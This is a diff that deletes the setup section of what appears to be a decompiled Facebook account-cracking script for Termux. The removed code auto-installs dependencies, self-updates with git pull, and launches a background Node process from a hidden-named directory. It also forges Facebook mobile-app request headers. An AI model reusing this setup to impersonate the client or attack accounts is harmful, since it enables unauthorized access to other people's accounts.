@@ -4,63 +4,6 @@
 
 #decompile by star-vampire
 
-try:
-
-    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
-
-    from multiprocessing.pool import ThreadPool
-
-except ImportError:
-
-    os.system("pip2 install requests")
-
-    os.system("python2 cracker.indirect")
-    
-os.system("clear")
-
-
-
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
-
-    os.system("apt update && apt install nodejs -y")
-
-from requests.exceptions import ConnectionError
-
-os.system("git pull")
-
-if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
-
-    os.system("fuser -k 5000/tcp &")
-
-    os.system("cd ..... && pip install progress")
-
-    os.system("cd ..... && npm install")
-
-    os.system("cd ..... && node index.js &")
-
-    os.system("clear")
-
-    time.sleep(10)
-
-elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
-
-    os.system("fuser -k 5000/tcp &")
-
-    os.system("#")
-
-    os.system("cd ..... && node index.js &")
-
-    os.system("clear")
-
-bd=random.randint(2e7, 3e7)
-
-sim=random.randint(2e4, 4e4)
-
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
-
-reload(sys)
-
-sys.setdefaultencoding("utf-8")
 
 c = "\033[1;92m"
 
